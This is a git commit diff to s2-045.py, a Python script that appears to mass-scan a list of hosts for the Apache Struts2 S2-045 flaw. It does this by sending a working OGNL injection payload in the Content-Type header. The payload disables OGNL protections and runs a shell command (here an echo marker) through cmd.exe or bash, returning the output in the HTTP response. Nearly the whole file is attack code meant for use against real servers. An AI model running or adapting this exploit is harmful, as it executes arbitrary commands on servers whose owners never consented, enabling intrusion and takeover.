58cd8bc232b68e04c0c35457f775cf69554c45d8
Miraclenana <hangeul83@outlook.com>
2018-01-09 20:25:44 +0900

    test3
    test3

--- s2-045.py
+++ s2-045.py
@@ -9,19 +9,20 @@ from requests.exceptions import ChunkedEncodingError
 warnings.filterwarnings("ignore")
 
 #################### PAYLOAD #############################
+
 PAYLOAD = {"s2_045": str("%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo !nf@Sec').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"),}
+
 #################### Result ##############################
 
 struts_result = ['!nf@Sec', '0.0.0.0:0']
 
 #################### Header ##############################
 
-header = {'user-agent': 'ifsec@ifsec', 'Content-Type': PAYLOAD["s2_045"]}
+header2 = {'user-agent': 'ifsec@ifsec', 'Content-Type': PAYLOAD["s2_045"]}
 
 ##########################################################
 
-Error_Message = ['Failed to establish a new connection', 'ConnectTimeoutError', "ConnectionResetError",
-                 "'Remote end closed connection without response"]
+Error_Message = ['Failed to establish a new connection', 'ConnectTimeoutError', "ConnectionResetError", "Remote end closed connection without response"]
 
 ##########################################################
 print('URL ', 'Re_URL ', 'S_Code ', 'Struts-V ', 'Result', 'Error Message')  # Default Code
@@ -33,7 +34,7 @@ for line in url:
     b = line.strip('\n')
     # s2-045
     try:
-        r = requests.get('http://' + b, headers=header, timeout=5, allow_redirects=True, verify=False, stream=True)
+        r = requests.get('http://' + b, headers=header2, timeout=5, allow_redirects=True, verify=False, stream=True)
         e = ''
         if r.url == 'http://' + b:
             for d in r.iter_lines():
@@ -47,7 +48,7 @@ for line in url:
             else :
                 print (b, r.url, r.status_code, 's2-045', 'False')
         else:
-            r = requests.get(r.url, headers=header, timeout=5, allow_redirects=True, verify=False, stream=True)
+            r = requests.get(r.url, headers=header2, timeout=5, allow_redirects=True, verify=False, stream=True)
             for d in r.iter_lines():
                 e += d.decode('utf-8')
                 break
@@ -63,8 +64,7 @@ for line in url:
         f = ''
         f += str(er)
         if Error_Message[0] in f:
-            r = requests.get('https://' + b, headers=header, timeout=5, allow_redirects=True, verify=False,
-                             stream=True)
+            r = requests.get('https://' + b, headers=header2, timeout=5, allow_redirects=True, verify=False, stream=True)
             for d in r.iter_lines():
                 e += d.decode('utf-8')
                 break
